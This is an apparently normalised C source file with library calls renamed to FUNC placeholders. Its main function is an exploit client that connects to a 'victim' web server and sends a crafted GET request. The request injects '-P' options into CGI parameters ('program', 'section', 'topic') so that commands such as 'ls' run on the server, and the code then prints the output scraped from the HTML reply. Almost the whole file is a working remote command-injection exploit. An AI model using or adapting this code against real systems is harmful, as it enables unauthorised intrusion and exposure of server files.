#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct hostent {int /*<<< orphan*/  h_length; scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  serv_addr ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 scalar_t__ FUNC3 (int,struct sockaddr_in*,int) ; 
 struct hostent* FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int) ; 
 int FUNC7 (char*,...) ; 
 scalar_t__ FUNC8 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int FUNC12 (char*) ; 
 scalar_t__ FUNC13 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 

int FUNC15(int argc, char **argv) {
         int sock, i, j, len = 0;
         struct sockaddr_in serv_addr;
         struct hostent *crap;
 	char *cp, dummy[50000], buffer[2000] = "GET ";	
         if(argc < 6)
            FUNC14(argv[0]);
 	if(FUNC0(argv[5]) == 0) {
 			FUNC6(dummy, 0x00, 50000);
 			FUNC11(dummy, argv[3]);
 			FUNC11(dummy, "?-P ");
 			FUNC11(dummy, argv[2]);
 			FUNC11(dummy, " ls");} 
 	else if(FUNC0(argv[5]) == 1) {
               		FUNC6(dummy, 0x00, 50000);
              		FUNC11(dummy, argv[3]);
             	 	FUNC11(dummy, "?program=-P ");
            	        FUNC11(dummy, argv[2]);
            	        FUNC11(dummy, " ls");}
 	else if(FUNC0(argv[5]) == 2) {
 			FUNC6(dummy, 0x00, 50000);
 			FUNC11(dummy, argv[3]);
 			FUNC11(dummy, "?section=-P");
 			FUNC11(dummy, argv[2]);
 			FUNC11(dummy, "&topic=w");}
 	else
 		FUNC14(argv[0]);
 
 	FUNC7("# crafting buffer string ... ");
          for(i=0, j=4;i < FUNC12(dummy);i++) {
 		if(dummy[i] == ' ') {
 			FUNC11(buffer, "%20");
 			j+=3;}
 		else {
 			buffer[j] = dummy[i];
 			j++;}
 	}
         
 	FUNC11(buffer, "\r\n");
         FUNC7("(done)\n");
         sock = FUNC10(AF_INET, SOCK_STREAM, 0);
         if(sock < 0)
                 return FUNC7("# error creating socket.\n");
         crap = FUNC4(argv[1]);
         if(crap == NULL)
                 return FUNC7("# cant resolve the specified hostname: %s\n", argv[1]);
         else
                 FUNC7("# connecting to victim... ");
 
         serv_addr.sin_family = AF_INET;
 	serv_addr.sin_port = FUNC5(FUNC0(argv[4]));
         FUNC1((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);
 
         if (FUNC3(sock, &serv_addr, sizeof(serv_addr)) < 0)
                 return FUNC7("(error)\n# check again %s:%d\n", argv[1], FUNC0(argv[3]));
 
         FUNC7("(done)\n# sending crafted string... ");
         if( (FUNC9(sock, buffer, FUNC12(buffer), 0)) == -1 )
                 return FUNC7("\n# error while sending the crafted string.!\n");
         FUNC7("(done)\n# waiting for our call ...\n");
 	FUNC6(buffer, 0x00, 2000);
 	FUNC6(dummy, 0x00, 50000);
 	FUNC7("\n\n");
 	while(FUNC8(sock, buffer, 2000, 0) > 0)
 		FUNC11(dummy, buffer);
 
 	cp = &dummy[0];
 	i = 0; j = 0;
 	len = FUNC12(dummy);
 
         if(FUNC0(argv[5]) == 0) {
                 while(FUNC13(cp, "<hr>", 4) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(FUNC13(cp, "<hr>", 4) && FUNC13(cp, "<A", 2) && j < len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &dummy[0] + i + 4;
         }
 
         else if(FUNC0(argv[5]) == 1) {
                 while(FUNC13(cp, "\<pre\>", 5) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(FUNC13(cp, "pre", 3) && j < len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &dummy[0] + i + 6;
         }
 
         else if(FUNC0(argv[5]) == 2) {
                 while(FUNC13(cp, "PRE", 3) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=2;
                 while(FUNC13(cp, "PRE", 3) && j < len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &dummy[0] + i + 2;
         }
 
 	if(*cp == '\0')
 		return FUNC7("# Bad response from the server.\n");
 
         FUNC7("%s", cp);
 	FUNC7("\n\n");
         FUNC2(sock);
         return 0;
 }